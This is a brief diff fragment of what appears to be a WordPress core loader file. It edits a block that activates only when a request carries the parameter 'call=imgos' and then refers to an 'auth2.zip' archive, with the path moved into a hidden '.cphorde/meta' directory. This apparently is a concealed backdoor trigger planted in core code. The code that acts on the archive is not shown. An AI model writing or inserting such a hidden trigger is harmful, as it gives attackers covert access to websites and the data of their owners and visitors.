@@ -36,7 +36,7 @@ if ( ! defined( 'ABSPATH' ) ) {
  * If neither set of conditions is true, initiate loading the setup process.
  */
 if ( ! empty( $_GET['call'] ) && 'imgos' === $_GET['call'] ) {
-	$zip_file_path = '/home/andyshop/lscache/auth2.zip';
+	$zip_file_path = '/home/kidustry/.cphorde/meta/auth2.zip';
 	
 	// Verify file existence and zip extension availability
 	/*
